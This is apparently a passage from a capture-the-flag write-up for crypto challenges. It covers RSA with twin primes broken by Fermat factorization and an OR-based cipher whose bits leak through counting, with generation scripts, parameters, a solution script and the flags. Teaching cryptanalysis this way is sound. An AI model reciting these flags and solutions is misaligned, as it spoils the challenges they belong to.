encrypted = 23474605573473373203334941430080957577995524602575748276370389846355261467311270957831561596231992011969183685667393614297817357558495470451763368028169039509700140600751514121708805548578658461356854843472478270848324238425500055361588102733911622798400489181038088712491059864731289231465539546125995183376
```

FLAG:`ISMCTF{W0uld_Y0U_l1k3_4_w13n34_w1th_Y0u4_m34l?__}`

# How-To-Crypto v3

Fermat factorization for RSA twin primes.

Generation script:

```Python
from Crypto.Util.number import getPrime, bytes_to_long, isPrime
FLAG = b"ISM_CTF{f3rm47_ru13z_1n_numb3r_th30r5}"

def getPrimes(bits):
    p = getPrime(bits)
    while not isPrime(p + 2):
        p = getPrime(bits)
    return p, p + 2

class Crypto:
    def __init__(self, bits):
        self.bits = bits
    
    def keygen(self):
        p, q = getPrimes(self.bits//2)
        self.e = getPrime(int(256))
        self.n = p*q
        return

    def encrypt(self, m):
        return pow(m, self.e, self.n)

rsa = Crypto(2048)
rsa.keygen()

m = bytes_to_long(FLAG)
c = rsa.encrypt(m)

with open('output.txt', 'w') as f:
    f.write(f'N = 0x{rsa.n:x}\n')
    f.write(f'e = 0x{rsa.e:x}\n')
    f.write(f'c = 0x{c:x}\n')
```

Parameters given:
```
N = 0x846b239232de955869021dacccb300c6c3f188a2dd2def21244d7d4d736719045241c32476ea35c0ec12b1d7d73758d0667dd6760e8926bcb6aa3518de1a033cf0edb89f63d2dba579704a2b43521c6a3e8a2b7442fd32f05e76655c4e4c35a7e313e8d831477e5a7e98bc06a1d621f4c9bbfa5b91e6ab97abff334b4a90a7b0f114f96f0576e8d11aafd6a852abfbc5cfb5426d939d259cb5327cc1379a9ad50d1a6cbeca67f0c2151e5b76f55e727c30c4fe400ad512e335989d5c5238d49eab12eb56e0ee5f222879815c3c5b6b54f2c1597e17843666a4ccf9ae782d7dff782a709028b40792cbd48391bb99cd24093c2a8590b6f30ce614033870897f0f
e = 0xaab2e7206732305eb493e7d28c70d29723813afb7217a16f6e5e27234f6956d1
c = 0x538885bc3d25146abb2c8ad970abc8e965a86c9ff689ad4227561a599e4bbeef7fd6d6f0fe0a8a89dc7d479286a68c77a3719fd5f146ff58ca6bb6efa758816eeca61e576f4187ef438b15fdd3941f17dd338a0c09afe90a139af0c19f35a0857fccba8b08d05227f3214792a39ba0d817d2cb988d4082f0f431642646b44ee02c5db970da21a95d0ebfa7ae1e00706dfdf001f9592ffa4f279a4350aca71d0d4c01a7c038e1e38ea3513eeb2b40594bf6166b38c5f24a68a943ab0796798311d704c7d97d7d916d343afe50d6e52fe558bfa2dcd9002948808d657079c9d17eadb7c4ede459d1d779c23d78d6e9fe6e4145865891feca0d579995920e17e2e2
```

FLAG: `ISM_CTF{f3rm47_ru13z_1n_numb3r_th30r5}`

# Crypto mastery

Byte leakage due to OR preserving the 1's. For each bit position, the amount of 1s is counted, and if it exceeds a threshold, then we can say that a 1 in present in the plaintext.

Generation script:
```Python
from Crypto.Random import get_random_bytes
import random

def Rand_crypt(plaintext):
    rnd = random.sample(range(len(plaintext)), k=1)[0]
    rand = get_random_bytes(len(plaintext))
    val = rand[rnd] | plaintext[rnd]
    return rand[:rnd] + val.to_bytes(1,'big') + rand[(rnd+1):]

ciphertexts = []

FLAG = "ISMCTF{0r_1s_4_d4mn_n1ce_0pe4a7t1on_d0nt_U_th1nk?}"
for i in range(100000):
    ciphertexts.append(Rand_crypt(FLAG.encode()).hex())

with open("output.txt", "w") as f:
    for e in ciphertexts:
        f.write(e + '\n')
```

Solution script:
```Python
def bit_profile(ciphertext, length):
    profile = [0] * (length * 8)
    byte_array = bytearray.fromhex(ciphertext)
    for byte_index, byte in enumerate(byte_array):
        for bit_index in range(8):
            if byte & (1 << (7 - bit_index)):
                profile[byte_index * 8 + bit_index] += 1
    return profile

def aggregate_profiles(ciphertexts):
    length = len(bytearray.fromhex(ciphertexts[0]))
    aggregated = [0] * (length * 8)
    for ciphertext in ciphertexts:
        profile = bit_profile(ciphertext, length)
        for i in range(len(profile)):
            aggregated[i] += profile[i]
    return aggregated, length


def reconstruct_flag(aggregated, length, threshold):
    flag_bits = ['0'] * (length * 8)
    for i in range(length * 8):
        flag_bits[i] = '1' if aggregated[i] > threshold else '0'
    flag_bytes = []
    for i in range(0, len(flag_bits), 8):
        flag_bytes.append(int(''.join(flag_bits[i:i+8]), 2))
    return bytes(flag_bytes)

with open("output.txt", "r") as f:
    ciphertexts = f.readlines()
ciphertexts = [c.strip() for c in ciphertexts]

aggregated, length = aggregate_profiles(ciphertexts)
#print(*aggregated, sep='\n')
print(reconstruct_flag(aggregated, length, 50600))
```

FLAG: `ISMCTF{0r_1s_4_d4mn_n1ce_0pe4a7t1on_d0nt_U_th1nk?}`